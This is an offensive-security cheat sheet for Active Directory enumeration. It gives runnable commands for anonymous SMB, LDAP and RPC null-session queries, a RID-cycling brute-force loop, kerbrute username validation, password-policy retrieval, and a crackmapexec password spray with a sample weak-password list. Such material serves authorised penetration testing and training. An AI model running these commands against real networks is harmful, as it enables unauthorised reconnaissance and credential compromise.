# AD Basic Enumeration — Cheat Sheet

> Phase: **Post-Discovery Enumeration**
> Goal: fingerprint AD-related services, pull anonymous/null-session data, build a user list, and learn the password policy before spraying.

## Variables used

| Placeholder | Meaning |
|---|---|
| `<DC_IP>` | Domain Controller / target IP |
| `<DOMAIN>` | Fully qualified domain, e.g. `corp.local` |
| `<SHARE>` | SMB share name |
| `<FILE>` | Filename to download |
| `<BASE_DN>` | LDAP base DN, e.g. `dc=corp,dc=local` |
| `<RID>` | Relative Identifier (integer) |
| `<USERLIST>` | Path to username wordlist |
| `<PASSLIST>` | Path to password wordlist |
| `<WRK_IP>` | Workstation IP (spray target) |

---

## 1. Service Discovery — Nmap

Key AD/Windows ports to prioritize:

| Port | Service | Why it matters |
|---|---|---|
| 88/TCP | Kerberos | Ticket attacks — Pass-the-Ticket, Kerberoasting |
| 135/TCP | RPC Endpoint Mapper | Service discovery for lateral movement / DCOM |
| 139/TCP | NetBIOS Session | Null sessions, info gathering |
| 389/TCP | LDAP | Plaintext — enumerate users/objects/policies |
| 445/TCP | SMB | File shares, EternalBlue, relay, cred theft |
| 636/TCP | LDAPS | Encrypted LDAP; AD CS cert-based abuse if misconfigured |

```bash
nmap -p 88,135,139,389,445,636 -sV -sC <DC_IP>
```

- `-sV` → service/version detection
- `-sC` → run default NSE scripts

---

## 2. SMB Enumeration

### 2.1 List shares (anonymous)

```bash
smbclient -L //<DC_IP> -N
```
`-N` = no password (null session / anonymous login)

### 2.2 Enumerate share permissions — smbmap

```bash
smbmap -H <DC_IP>
```
Shows READ/WRITE access per share — flags non-standard / juicy shares fast.

### 2.3 Enumerate share permissions — Nmap NSE alternative

```bash
nmap -p445 --script smb-enum-shares <DC_IP>
```

### 2.4 Access & download from a readable share

```bash
smbclient //<DC_IP>/<SHARE> -N
smb: \> ls
smb: \> get <FILE>
```

> 👀 Always check for non-default share names — they're often staging/backup/user shares with real data.

---

## 3. LDAP Enumeration (Anonymous Bind)

Test if anonymous bind is allowed:

```bash
ldapsearch -x -H ldap://<DC_IP> -s base
```

| Flag | Meaning |
|---|---|
| `-x` | Simple (anonymous) authentication |
| `-H` | LDAP server URI |
| `-s base` | Query base object only (no subtree search) |

If anonymous bind works, pull person objects:

```bash
ldapsearch -x -H ldap://<DC_IP> -b "<BASE_DN>" "(objectClass=person)"
```

---

## 4. Enum4linux-ng (All-in-One)

Automates SMB/RPC-based enumeration: users, groups, shares, password policy, RID cycling, OS/NetBIOS info.

```bash
enum4linux-ng -A <DC_IP> -oA results.txt
```

- `-A` → run all enumeration modules
- `-oA` → output to YAML + JSON

---

## 5. RPC Enumeration — Null Sessions

Verify null session access:

```bash
rpcclient -U "" <DC_IP> -N
```
- `-U ""` → empty username (anonymous)
- `-N` → don't prompt for password

Inside the shell:

```bash
rpcclient $> enumdomusers
```
Run `help` inside `rpcclient` for the full command list.

### 5.1 RID Cycling (when `enumdomusers` is restricted)

Well-known RIDs:

| RID | Object |
|---|---|
| 500 | Administrator |
| 501 | Guest |
| 512 | Domain Admins |
| 513 | Domain Users |
| 514 | Domain Guests |
| 1000+ | Regular user accounts |

Manual brute of RIDs via null session:

```bash
for i in $(seq 500 2000); do
  echo "queryuser $i" | rpcclient -U "" -N <DC_IP> 2>/dev/null | grep -i "User Name"
done
```

- `seq 500 2000` → RID range to try
- `echo "queryuser $i" | rpcclient ...` → query that RID
- `2>/dev/null` → suppress errors
- `grep -i "User Name"` → filter to valid hits only

---

## 6. Username Enumeration via Kerberos — Kerbrute

```bash
./kerbrute userenum --dc <DC_IP> -d <DOMAIN> <USERLIST>
```

Setup (if not preinstalled):
```bash
# download the release binary for your OS from the kerbrute GitHub releases page
mv kerbrute_linux_amd64 kerbrute
chmod +x kerbrute
```

---

## 7. Password Policy Enumeration

Know the lockout threshold **before** spraying.

### 7.1 Via rpcclient (null session)

```bash
rpcclient -U "" <DC_IP> -N
rpcclient $> getdompwinfo
```

Example output:
```
min_password_length: 12
password_properties: 0x00000001   # DOMAIN_PASSWORD_COMPLEX
```

### 7.2 Via CrackMapExec / NetExec (anonymous)

```bash
crackmapexec smb <DC_IP> --pass-pol
# or with nxc:
nxc smb <DC_IP> --pass-pol
```

### 7.3 Reading the complexity flag

`password_properties: 0x00000001` (complexity enabled) means passwords need **≥3 of 4**:
- Uppercase letters
- Lowercase letters
- Digits
- Special characters

Also: password can't contain the username or >2 consecutive chars of the full name.

---

## 8. Building a Spray List & Spraying

Example policy-compliant candidate list (based on OSINT of a known breach string "Password"):

```
Password!
Password1
Password1!
P@ssword
Pa55word1
```

Spray with CrackMapExec:

```bash
crackmapexec smb <WRK_IP> -u <USERLIST> -p <PASSLIST>
```

> See the AD Breaching sheet for NetExec `--continue-on-success` / `--jitter` usage and lockout-safe spraying method.

---

## 9. Quick Workflow Summary

```
1. nmap -p 88,135,139,389,445,636 -sV -sC <DC_IP>   → map AD services
2. smbclient -L / smbmap -H                          → list + perm-check shares
3. smbclient // ... -N  → ls → get <FILE>            → pull data from readable shares
4. ldapsearch -x -s base                             → test anonymous LDAP bind
5. enum4linux-ng -A                                  → automated full enum
6. rpcclient -U "" -N → enumdomusers / RID cycling   → build username list
7. kerbrute userenum                                 → validate usernames via Kerberos
8. rpcclient getdompwinfo / crackmapexec --pass-pol  → learn lockout policy
9. Build compliant password list → spray safely
```
